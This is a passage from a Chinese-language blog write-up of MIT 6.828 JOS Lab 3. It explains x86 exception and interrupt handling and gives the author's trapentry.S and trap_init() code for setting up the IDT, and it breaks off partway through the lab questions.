id="Interrupt-Summary"><a href="#Interrupt-Summary" class="headerlink" title="Interrupt Summary"></a>Interrupt Summary</h4><p>下表总结了 386 所识别的异常：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Table 9-6. Exception Summary</span><br><span class="line"></span><br><span class="line">Description               Interrupt   Return Address  Exception     Function That Can Generate</span><br><span class="line">Number      Points to       Type          the Exception</span><br><span class="line">Faulting</span><br><span class="line">Instruction</span><br><span class="line"></span><br><span class="line">Divide error               0          YES             FAULT         DIV, IDIV</span><br><span class="line">Debug exceptions           1</span><br><span class="line">Some debug exceptions are traps and some are faults.  The exception</span><br><span class="line">handler can determine which has occurred by examining DR6.  (Refer to Chapter 12.)</span><br><span class="line">Some debug exceptions are traps and some are faults.  The exception</span><br><span class="line">handler can determine which has occurred by examining DR6.  (Refer to Chapter 12.) Any instruction</span><br><span class="line">Breakpoint                 3          NO              TRAP          One-byte INT 3</span><br><span class="line">Overflow                   4          NO              TRAP          INTO</span><br><span class="line">Bounds check               5          YES             FAULT         BOUND</span><br><span class="line">Invalid opcode             6          YES             FAULT         Any illegal instruction</span><br><span class="line">Coprocessor not available  7          YES             FAULT         ESC, WAIT</span><br><span class="line">Double fault               8          YES             ABORT         Any instruction that can</span><br><span class="line">generate an exception</span><br><span class="line">Coprocessor Segment</span><br><span class="line">Overrun                    9          NO              ABORT         Any operand of an ESC</span><br><span class="line">instruction that wraps around</span><br><span class="line">the end of a segment.</span><br><span class="line">Invalid TSS               10          YES             FAULT</span><br><span class="line">An invalid-TSS fault is not restartable if it occurs during the</span><br><span class="line">processing of an external interrupt.        JMP, CALL, IRET, any interrupt</span><br><span class="line">Segment not present       11          YES             FAULT         Any segment-register modifier</span><br><span class="line">Stack exception           12          YES             FAULT         Any memory reference thru SS</span><br><span class="line">General Protection        13          YES             FAULT/ABORT</span><br><span class="line">All GP faults are restartable. If the fault occurs while attempting to</span><br><span class="line">vector to the handler for an external interrupt, the interrupted program is</span><br><span class="line">restartable, but the interrupt may be lost.  Any memory reference or code</span><br><span class="line">fetch</span><br><span class="line">Page fault                14          YES             FAULT         Any memory reference or code</span><br><span class="line">fetch</span><br><span class="line">Coprocessor error         16          YES             FAULT</span><br><span class="line">Coprocessor errors are reported as a fault on the first ESC or WAIT</span><br><span class="line">instruction executed after the ESC instruction that caused the error.        ESC, WAIT</span><br><span class="line">Two-byte SW Interrupt     0-255       NO              TRAP          INT n</span><br></pre></td></tr></table></figure><blockquote><p>详细说明参见 <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/s09_08.htm">https://pdos.csail.mit.edu/6.828/2018/readings/i386/s09_08.htm</a></p></blockquote><h4 id="Error-Code"><a href="#Error-Code" class="headerlink" title="Error Code"></a>Error Code</h4><p>若异常与一个特定的段相关联，则处理器会将一个错误代码存到异常处理程序的栈上，格式如下图所示</p><p><img src="https://s2.loli.net/2022/03/17/zTLnsmHUW2RVYue.png" alt="image.png"></p><p>在错误代码中并不包含特权级字段，取而代之的是两个新的位：</p><ul><li>EXT bit：程序外部的事件造成了异常</li><li>I-bit（IDT-bit）：错误代码的 index 字段引用 IDT 中的门描述符</li></ul><p>若未设置 I-bit，则 TI 位指示错误代码引用 GDT（0）还是 LDT（1），剩下的 14 位为段选择子的高 14 位</p><p>下表总结了异常中的错误代码信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Description                       Interrupt     Error Code</span><br><span class="line">Number</span><br><span class="line"></span><br><span class="line">Divide error                       0            No</span><br><span class="line">Debug exceptions                   1            No</span><br><span class="line">Breakpoint                         3            No</span><br><span class="line">Overflow                           4            No</span><br><span class="line">Bounds check                       5            No</span><br><span class="line">Invalid opcode                     6            No</span><br><span class="line">Coprocessor not available          7            No</span><br><span class="line">System error                       8            Yes (always 0)</span><br><span class="line">Coprocessor Segment Overrun        9            No</span><br><span class="line">Invalid TSS                       10            Yes</span><br><span class="line">Segment not present               11            Yes</span><br><span class="line">Stack exception                   12            Yes</span><br><span class="line">General protection fault          13            Yes</span><br><span class="line">Page fault                        14            Yes</span><br><span class="line">Coprocessor error                 16            No</span><br><span class="line">Two-byte SW interrupt             0-255         No</span><br></pre></td></tr></table></figure><h3 id="Basics-of-Protected-Control-Transfer"><a href="#Basics-of-Protected-Control-Transfer" class="headerlink" title="Basics of Protected Control Transfer"></a>Basics of Protected Control Transfer</h3><p>异常与中断都是“被保护的控制流切换”——将处理器切换至内核态（CPL&#x3D;0），且不会给用户态代码影响内核或其他环境的机会</p><p>在 Intel 术语中，一个中断通常是由处理器外部的异步事件触发的，例如外设的 I&#x2F;O；而异常则是由当前运行的代码同步触发的事件，例如非法内存访问</p><p>为了确保中断与异常“真正受到保护”，其被设计为：触发其的代码只能在特定条件下进入内核的特定位置，通过以下两种机制：</p><ul><li><strong>中断描述符表</strong>：处理器确保中断与异常只能通过特定的入口点进入内核，这便是中断描述符表中的「门」结构，x86允许多达 256 个不同的入口点——对应 256 个中断描述符表索引，处理器从该表中对应条目加载：<ul><li>eip：异常处理程序代码地址</li><li>cs：代码段选择子，在其 0 ~ 1 位中包含运行异常处理程序的特权级（在 JOS 中所有异常都在 0 特权级下处理）</li></ul></li><li><strong>任务状态段</strong>：处理器需要一个地方来保存中断发生前的上下文，以便在完成处理后恢复上下文，但这个区域不应当被用户进程访问，中断处理需要陷入内核，于是也需要独立的内核堆栈，因此<strong>任务状态段</strong>（TSS）结构指定了内核堆栈的地址与段选择子，处理器将旧的 ss、esp、eflags、cs、eip、（可选）error code 压到内核栈上，从中断描述符中加载 cs 与 eip，并设置 <code>ss:esp</code> 以引用新的堆栈</li></ul><p>我们在 JOS 中 TSS 仅用来定义从用户态切换到内核态时应切换到的内核堆栈，不使用其他字段</p><h3 id="Types-of-Exceptions-and-Interrupts"><a href="#Types-of-Exceptions-and-Interrupts" class="headerlink" title="Types of Exceptions and Interrupts"></a>Types of Exceptions and Interrupts</h3><p><del>说过了.jpg</del></p><p>本节我们将扩展 JOS 的 0 ~31 号异常向量，下一届我们将扩展软中断（0x30）作为 JOS 的系统调用入口点，在 lab4 中我们将扩展 JOS 以让其处理硬件中断（例如时钟中断）</p><h3 id="An-Example"><a href="#An-Example" class="headerlink" title="An Example"></a>An Example</h3><p><del>懒得看，反正就那回事</del></p><h3 id="Nested-Exceptions-and-Interrupts"><a href="#Nested-Exceptions-and-Interrupts" class="headerlink" title="Nested Exceptions and Interrupts"></a>Nested Exceptions and Interrupts</h3><p>对于内核中的嵌套中断而言不需要重复切换内核堆栈，只需要保存旧的上下文到内核堆栈上即可</p><h3 id="Setting-Up-the-IDT"><a href="#Setting-Up-the-IDT" class="headerlink" title="Setting Up the IDT"></a>Setting Up the IDT</h3><p>接下来我们将设置 IDT 的 0~31 号中断向量，随后我们会设置系统调用中断的处理程序，在后面的 lab 中设置 32 ~ 47 号中断（设备中断）</p><p>我们应当实现如下所示控制流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">      IDT                   trapentry.S         trap.c</span><br><span class="line">   </span><br><span class="line">+----------------+                        </span><br><span class="line">|   &amp;handler1    |---------&gt; handler1:          trap (struct Trapframe *tf)</span><br><span class="line">|                |             // do stuff      &#123;</span><br><span class="line">|                |             call trap          // handle the exception/interrupt</span><br><span class="line">|                |             // ...           &#125;</span><br><span class="line">+----------------+</span><br><span class="line">|   &amp;handler2    |--------&gt; handler2:</span><br><span class="line">|                |            // do stuff</span><br><span class="line">|                |            call trap</span><br><span class="line">|                |            // ...</span><br><span class="line">+----------------+</span><br><span class="line">       .</span><br><span class="line">       .</span><br><span class="line">       .</span><br><span class="line">+----------------+</span><br><span class="line">|   &amp;handlerX    |--------&gt; handlerX:</span><br><span class="line">|                |             // do stuff</span><br><span class="line">|                |             call trap</span><br><span class="line">|                |             // ...</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p>每一个异常或中断都应在 <code>trapentry.S</code> 中有其自己的 handler，而 <code>trap_init()</code> 应当初始化这些 handler，每个 handler 应当在栈上建立一个 <code>struct Trapframe</code>（参见 <code>inc/trap.h</code>）并将其指针作为参数调用 <code>trap()</code>，由其对应调用到相应的处理函数</p><p>补充了那么多的基础知识，接下来是 Exercise 4——编辑 <code>trapentry.S</code> 与 <code>trap.c</code> 实现中断与异常处理</p><blockquote><p><strong>Exercise 4.</strong> Edit <code>trapentry.S</code> and <code>trap.c</code> and implement the features described above. The macros <code>TRAPHANDLER</code> and <code>TRAPHANDLER_NOEC</code> in <code>trapentry.S</code> should help you, as well as the T_* defines in <code>inc/trap.h</code>. You will need to add an entry point in <code>trapentry.S</code> (using those macros) for each trap defined in <code>inc/trap.h</code>, and you’ll have to provide <code>_alltraps</code> which the <code>TRAPHANDLER</code> macros refer to. You will also need to modify <code>trap_init()</code> to initialize the <code>idt</code> to point to each of these entry points defined in <code>trapentry.S</code>; the <code>SETGATE</code> macro will be helpful here.</p><p>Your <code>_alltraps</code> should:</p><ol><li>push values to make the stack look like a struct Trapframe</li><li>load <code>GD_KD</code> into <code>%ds</code> and <code>%es</code></li><li><code>pushl %esp</code> to pass a pointer to the Trapframe as an argument to trap()</li><li><code>call trap</code> (can <code>trap</code> ever return?)</li></ol><p>Consider using the <code>pushal</code> instruction; it fits nicely with the layout of the <code>struct Trapframe</code>.</p><p>Test your trap handling code using some of the test programs in the <code>user</code> directory that cause exceptions before making any system calls, such as <code>user/divzero</code>. You should be able to get make grade to succeed on the <code>divzero</code>, <code>softint</code>, and <code>badsegment</code> tests at this point.</p></blockquote><p>我们需要在 <code>trapentry.S</code> 中建立中断入口点，这里 JOS 预先为我们提供了两个宏用来声明这些入口点，他们最终都会跳转到 <code>_alltraps</code> 标号处：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">* TRAPHANDLER defines a globally-visible function <span class="keyword">for</span> handling a trap.</span><br><span class="line"> * It pushes a trap number onto the <span class="built_in">stack</span>, then jumps to _alltraps.</span><br><span class="line"> * Use TRAPHANDLER <span class="keyword">for</span> traps where the CPU automatically pushes an error code.</span><br><span class="line"> *</span><br><span class="line"> * You shouldn<span class="number">&#x27;</span>t call a TRAPHANDLER function from C, but you may</span><br><span class="line"> * need to _declare_ one in <span class="title function_">C</span> <span class="params">(<span class="keyword">for</span> instance, to get a function pointer</span></span><br><span class="line"><span class="params"> * during IDT setup)</span>.  You can declare the function with</span><br><span class="line"> *   <span class="type">void</span> <span class="title function_">NAME</span><span class="params">()</span>;</span><br><span class="line"> * where NAME is the argument passed to TRAPHANDLER.</span><br><span class="line"> */</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRAPHANDLER(name, num)\</span></span><br><span class="line"><span class="meta">.globl name;<span class="comment">/* define global symbol for &#x27;name&#x27; */</span>\</span></span><br><span class="line"><span class="meta">.type name, @function;<span class="comment">/* symbol type is function */</span>\</span></span><br><span class="line"><span class="meta">.align 2;<span class="comment">/* align function definition */</span>\</span></span><br><span class="line"><span class="meta">name:<span class="comment">/* function starts here */</span>\</span></span><br><span class="line"><span class="meta">pushl $(num);\</span></span><br><span class="line"><span class="meta">jmp _alltraps</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Use TRAPHANDLER_NOEC for traps where the CPU doesn&#x27;t push an error code.</span></span><br><span class="line"><span class="comment"> * It pushes a 0 in place of the error code, so the trap frame has the same</span></span><br><span class="line"><span class="comment"> * format in either case.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRAPHANDLER_NOEC(name, num)\</span></span><br><span class="line"><span class="meta">.globl name;\</span></span><br><span class="line"><span class="meta">.type name, @function;\</span></span><br><span class="line"><span class="meta">.align 2;\</span></span><br><span class="line"><span class="meta">name:\</span></span><br><span class="line"><span class="meta">pushl $0;\</span></span><br><span class="line"><span class="meta">pushl $(num);\</span></span><br><span class="line"><span class="meta">jmp _alltraps</span></span><br></pre></td></tr></table></figure><p>我们先参照 <code>inc/trap.h</code> 中提供的 <code>T_*</code> 宏声明对应入口点，对于会有 error code 的中断使用 <code>TRAPHANDLER</code> 宏，否则使用 </p><p><code>TRAPHANDLER_NOEC</code> 宏，是否有 error code 参见上面的表格；宏里的 <code>name</code> 字段好像是可以随意声明的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Lab 3: Your code here for generating entry points for the different traps.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">TRAPHANDLER_NOEC(int0, T_DIVIDE)</span><br><span class="line">TRAPHANDLER_NOEC(int1, T_DEBUG)</span><br><span class="line">TRAPHANDLER_NOEC(int2, T_NMI)</span><br><span class="line">TRAPHANDLER_NOEC(int3, T_BRKPT)</span><br><span class="line">TRAPHANDLER_NOEC(int4, T_OFLOW)</span><br><span class="line">TRAPHANDLER_NOEC(int5, T_BOUND)</span><br><span class="line">TRAPHANDLER_NOEC(int6, T_ILLOP)</span><br><span class="line">TRAPHANDLER_NOEC(int7, T_DEVICE)</span><br><span class="line">TRAPHANDLER(int8, T_DBLFLT)</span><br><span class="line"></span><br><span class="line">TRAPHANDLER(int10, T_TSS)</span><br><span class="line">TRAPHANDLER(int11, T_SEGNP)</span><br><span class="line">TRAPHANDLER(int12, T_STACK)</span><br><span class="line">TRAPHANDLER(int13, T_GPFLT)</span><br><span class="line">TRAPHANDLER(int14, T_PGFLT)</span><br><span class="line"></span><br><span class="line">TRAPHANDLER_NOEC(int16, T_FPERR)</span><br><span class="line">TRAPHANDLER_NOEC(__syscall, T_SYSCALL)</span><br></pre></td></tr></table></figure><p>之后就是实现 <code>_alltraps</code>，按注释我们应当向栈上压入对应数据形成一个 <code>Trapframe</code> 结构体，实际上只需要推入 es、ds、<code>PushRegs</code> 结构体，剩余的都会在我们运行到 <code>_alltraps</code> 前被压入栈上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PushRegs</span> &#123;</span></span><br><span class="line"><span class="comment">/* registers as pushed by pusha */</span></span><br><span class="line"><span class="type">uint32_t</span> reg_edi;</span><br><span class="line"><span class="type">uint32_t</span> reg_esi;</span><br><span class="line"><span class="type">uint32_t</span> reg_ebp;</span><br><span class="line"><span class="type">uint32_t</span> reg_oesp;<span class="comment">/* Useless */</span></span><br><span class="line"><span class="type">uint32_t</span> reg_ebx;</span><br><span class="line"><span class="type">uint32_t</span> reg_edx;</span><br><span class="line"><span class="type">uint32_t</span> reg_ecx;</span><br><span class="line"><span class="type">uint32_t</span> reg_eax;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Trapframe</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PushRegs</span> <span class="title">tf_regs</span>;</span></span><br><span class="line"><span class="type">uint16_t</span> tf_es;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding1;</span><br><span class="line"><span class="type">uint16_t</span> tf_ds;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding2;</span><br><span class="line"><span class="type">uint32_t</span> tf_trapno;</span><br><span class="line"><span class="comment">/* below here defined by x86 hardware */</span></span><br><span class="line"><span class="type">uint32_t</span> tf_err;</span><br><span class="line"><span class="type">uintptr_t</span> tf_eip;</span><br><span class="line"><span class="type">uint16_t</span> tf_cs;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding3;</span><br><span class="line"><span class="type">uint32_t</span> tf_eflags;</span><br><span class="line"><span class="comment">/* below here only when crossing rings, such as from user to kernel */</span></span><br><span class="line"><span class="type">uintptr_t</span> tf_esp;</span><br><span class="line"><span class="type">uint16_t</span> tf_ss;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding4;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><p>这里的 padding 其实不需要我们手动压入栈上，我们在使用 <code>pushl</code> 指令压入 ds 与 es 时他们会自动扩展为 4 字节；之后我们还需要将 ds 与 es 的值设为 <code>GD_KD</code>，最后压入 esp 后手动调用 <code>trap()</code> 即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Lab 3: Your code here for _alltraps</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">_alltraps:</span><br><span class="line">pushl %ds</span><br><span class="line">pushl %es</span><br><span class="line">pushal</span><br><span class="line">push $GD_KD</span><br><span class="line">popl %ds</span><br><span class="line">push $GD_KD</span><br><span class="line">popl %es</span><br><span class="line">pushl %esp</span><br><span class="line">call trap</span><br></pre></td></tr></table></figure><p>最后使用 <code>SETGATE</code> 宏在 <code>trap_init()</code> 中装载中断描述符，其接收的第一个参数是一个 <code>Gatedesc</code> 类型结构体，用来表示一个门描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gate descriptors for interrupts and traps</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Gatedesc</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> gd_off_15_0 : <span class="number">16</span>;   <span class="comment">// low 16 bits of offset in segment</span></span><br><span class="line"><span class="type">unsigned</span> gd_sel : <span class="number">16</span>;        <span class="comment">// segment selector</span></span><br><span class="line"><span class="type">unsigned</span> gd_args : <span class="number">5</span>;        <span class="comment">// # args, 0 for interrupt/trap gates</span></span><br><span class="line"><span class="type">unsigned</span> gd_rsv1 : <span class="number">3</span>;        <span class="comment">// reserved(should be zero I guess)</span></span><br><span class="line"><span class="type">unsigned</span> gd_type : <span class="number">4</span>;        <span class="comment">// type(STS_&#123;TG,IG32,TG32&#125;)</span></span><br><span class="line"><span class="type">unsigned</span> gd_s : <span class="number">1</span>;           <span class="comment">// must be 0 (system)</span></span><br><span class="line"><span class="type">unsigned</span> gd_dpl : <span class="number">2</span>;         <span class="comment">// descriptor(meaning new) privilege level</span></span><br><span class="line"><span class="type">unsigned</span> gd_p : <span class="number">1</span>;           <span class="comment">// Present</span></span><br><span class="line"><span class="type">unsigned</span> gd_off_31_16 : <span class="number">16</span>;  <span class="comment">// high bits of offset in segment</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里因为<strong>我们还没有定义任何处理函数所以直接声明新的函数即可</strong>，现在还没有出现陷阱所以都是普通的中断，这里注意系统调用与调试中断的特权级应设为3，因为用户进程需要能够访问其入口点：</p><blockquote><p>一开始笔者在想，好像还没有函数定义啊，后面看了一眼别人的实验报告，直接声明新的函数，还没有函数体，属实佩服…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">trap_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">Segdesc</span> <span class="title">gdt</span>[];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// declaration</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">int0</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int1</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int2</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int3</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int4</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int5</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int6</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int7</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int8</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">int10</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int11</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int12</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int13</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int14</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">int16</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> __syscall()</span><br><span class="line">&#123;</span><br><span class="line">cprintf(<span class="string">&quot;syscall!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set up IDT</span></span><br><span class="line">SETGATE(idt[T_DIVIDE], <span class="number">0</span>, GD_KT, int0, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DEBUG], <span class="number">0</span>, GD_KT, int1, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_NMI], <span class="number">0</span>, GD_KT, int2, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_BRKPT], <span class="number">0</span>, GD_KT, int3, <span class="number">3</span>);</span><br><span class="line">SETGATE(idt[T_OFLOW], <span class="number">0</span>, GD_KT, int4, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_BOUND], <span class="number">0</span>, GD_KT, int5, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_ILLOP], <span class="number">0</span>, GD_KT, int6, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DEVICE], <span class="number">0</span>, GD_KT, int7, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DBLFLT], <span class="number">0</span>, GD_KT, int8, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">SETGATE(idt[T_TSS], <span class="number">0</span>, GD_KT, int10, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_SEGNP], <span class="number">0</span>, GD_KT, int11, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_STACK], <span class="number">0</span>, GD_KT, int12, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_GPFLT], <span class="number">0</span>, GD_KT, int13, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_PGFLT], <span class="number">0</span>, GD_KT, int14, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">SETGATE(idt[T_FPERR], <span class="number">0</span>, GD_KT, int16, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_SYSCALL], <span class="number">0</span>, GD_KT, __syscall, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Per-CPU setup </span></span><br><span class="line">trap_init_percpu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里笔者将 syscall 定义为一个打印函数，运行效果如下，成功通过中断门完成了系统调用：</p><p><img src="https://s2.loli.net/2022/03/17/O9Y6lED152vKHIZ.png" alt="image.png"></p><p>当然，后面 panic 掉了，因为我们的中断处理程序没有完成</p><blockquote><p>这个时候运行评分程序应当有 30 分</p></blockquote><p>接下来看一下 Challenge，让我们自动化生成一个 table：</p><blockquote><p><em>Challenge!</em> You probably have a lot of very similar code right now, between the lists of <code>TRAPHANDLER</code> in <code>trapentry.S</code> and their installations in <code>trap.c</code>. Clean this up. Change the macros in <code>trapentry.S</code> to automatically generate a table for <code>trap.c</code> to use. Note that you can switch between laying down code and data in the assembler by using the directives <code>.text</code> and <code>.data</code>.</p></blockquote><p><del>不会做，摸了</del></p><p>最后是习题 Time：</p><blockquote><p><strong>Questions</strong></p><p>Answer the following questions in your <code>answers-lab3.txt</code>:</p><ol><li><p>What is the purpose of having an individual handler function for each exception&#x2F;interrupt? (i.e., if all exceptions&#x2F;interrupts were delivered to the same handler, what feature that exists in the current implementation could not be provided?)</p><p>笔者只能想到是为了降低代码的耦合性，因为其实并非是不能全部通过同一函数实现中断处理，只不过是把各个中断处理程序塞到中断入口点里罢了</p></li><li><p>Did you have to do anything to make the <code>user/softint</code> program behave correctly? The grade script expects it to produce a general protection fault (trap 13), but <code>softint</code>‘s code says <code>int $14</code>. <em>Why</em> should this produce interrupt vector 13? What happens if the kernel actually allows <code>softint</code>‘s <code>int $14</code> instruction to invoke the kernel’s page fault handler (which is interrupt 